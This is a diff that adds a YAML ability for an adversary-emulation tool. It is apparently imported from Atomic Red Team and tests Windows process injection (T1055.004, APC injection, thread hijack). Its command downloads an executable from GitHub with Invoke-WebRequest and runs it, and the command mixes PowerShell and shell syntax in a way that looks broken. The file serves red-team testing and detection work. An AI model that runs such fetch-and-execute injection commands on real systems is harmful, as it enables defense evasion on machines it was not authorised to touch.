@@ -1,0 +1,64 @@
+- id: 611b39b7-e243-4c81-87a4-7145a90358b1
+  name: Process Injection via C#
+  description: 'Process Injection using C#
+
+    reference: https://github.com/pwndizzle/c-sharp-memory-injection
+
+    Excercises Five Techniques
+
+    1. Process injection
+
+    2. ApcInjectionAnyProcess
+
+    3. ApcInjectionNewProcess
+
+    4. IatInjection
+
+    5. ThreadHijack
+
+    Upon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques.
+    Output will be via stdout.'
+  tactic: defense-evasion
+  technique:
+    attack_id: T1055.004
+    name: 'Process Injection: Asynchronous Procedure Call'
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1055.004\bin\T1055.exe") {exit
+          0} else {exit 1}; then : ; else New-Item -Type Directory (split-path "PathToAtomicsFolder\T1055.004\bin\T1055.exe")
+          -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe"
+          -OutFile "PathToAtomicsFolder\T1055.004\bin\T1055.exe"; fi; "PathToAtomicsFolder\T1055.004\bin\T1055.exe"'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1055.004
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      exe_binary:
+        description: Output Binary
+        type: path
+        default: PathToAtomicsFolder\T1055.004\bin\T1055.exe
+    dependencies:
+    - description: '#{exe_binary} must be exist on system.
+
+        '
+      prereq_command: 'if (Test-Path "#{exe_binary}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{exe_binary}") -ErrorAction
+        ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe"
+        -OutFile "#{exe_binary}"
+
+        '
+    technique_created: '2020-01-14T01:29:43.786Z'
+    atomic_guid: 611b39b7-e243-4c81-87a4-7145a90358b1
+    import_timestamp: '2025-06-24T11:15:00.810465Z'
